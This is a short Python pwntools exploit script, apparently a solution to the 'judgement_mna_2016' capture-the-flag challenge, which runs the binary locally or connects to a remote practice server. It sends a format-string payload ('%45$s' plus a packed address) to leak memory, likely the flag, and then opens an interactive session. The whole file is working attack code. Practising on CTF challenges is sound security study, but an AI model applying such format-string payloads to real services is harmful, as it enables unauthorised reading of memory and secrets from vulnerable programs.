import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./judgement_mna_2016')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./judgement_mna_2016')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',26330)
			elf=ELF('./judgement_mna_2016')
			#libc=ELF('')

		io.recv()
		pay='%45$s\x00\x00\x00'+p32(0x0804a0a0)
		io.sendline(pay)
		io.recv()
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue